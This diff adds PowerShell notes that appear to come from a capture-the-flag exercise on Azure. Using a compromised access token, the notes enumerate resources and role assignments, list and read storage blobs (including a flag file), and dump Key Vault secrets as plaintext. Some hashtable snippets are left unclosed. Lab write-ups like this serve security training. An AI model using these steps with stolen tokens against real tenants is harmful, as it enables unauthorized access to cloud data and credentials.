@@ -1,0 +1,82 @@
+#Connect to an Azure resource with a compromised token and AccountID
+$token = 'asdadad...'
+Connect-AZAccount -AccessToken $token -AccountID 9fsadsa-as3-asdad-a-fer-afrt5vt55
+
+#############
+Which resources can we read from 'at least'. 
+
+Get-AzResource
+
+######
+
+Get-AZRoleAssignment
+###
+
+$STGToken = 'asdadsadasdsada....'
+$URL = "https://coresat.blob.core.windows.net/?comp=list"
+
+$Params = @{
+"URI" = $URL
+"Method" = "Get"
+"Headers" = @{
+"Content-Type" = "application/json"
+"Authorization" = "Bearer $STGToken"
+"x-ms-version" = "2017-11-09"
+"accept-encoding" = "gzip, deflate"
+
+$Result = Invoke-RestMethod @Params -UseBasicParsing
+$Result
+<Enter>
+
+###########
+Display blobs inside of the data.
+- we modify the $URL
+
+$STGToken = 'asdadsadasdsada....'
+$URL = "https://coresat.blob.core.windows.net/datahandling?restype=container&comp=list"
+
+$Params = @{
+"URI" = $URL
+"Method" = "Get"
+"Headers" = @{
+"Content-Type" = "application/json"
+"Authorization" = "Bearer $STGToken"
+"x-ms-version" = "2017-11-09"
+"accept-encoding" = "gzip, deflate"
+
+$Result = Invoke-RestMethod @Params -UseBasicParsing
+$Result
+<Enter>
+
+###################
+$STGToken = 'asdadsadasdsada....'
+$URL = "https://coresat.blob.core.windows.net/datahandling/Flag7.txt"
+
+$Params = @{
+"URI" = $URL
+"Method" = "Get"
+"Headers" = @{
+"Content-Type" = "application/json"
+"Authorization" = "Bearer $STGToken"
+"x-ms-version" = "2017-11-09"
+"accept-encoding" = "gzip, deflate"
+
+$Result = Invoke-RestMethod @Params -UseBasicParsing
+$Result
+<Enter>
+
+###########
+
+https://{vault-name}.vault.azure.net/{object-type}/{object-name}/{object-version}
+
+############
+Get-AZKeyVaultSecret -VaultName CodeSatellite -Name Secrets -AsPlaintText <some base64 code>
+
+###
+
+Get-AZKeyVaultKey -VaultName CubeSatellite
+
+
+
+
+
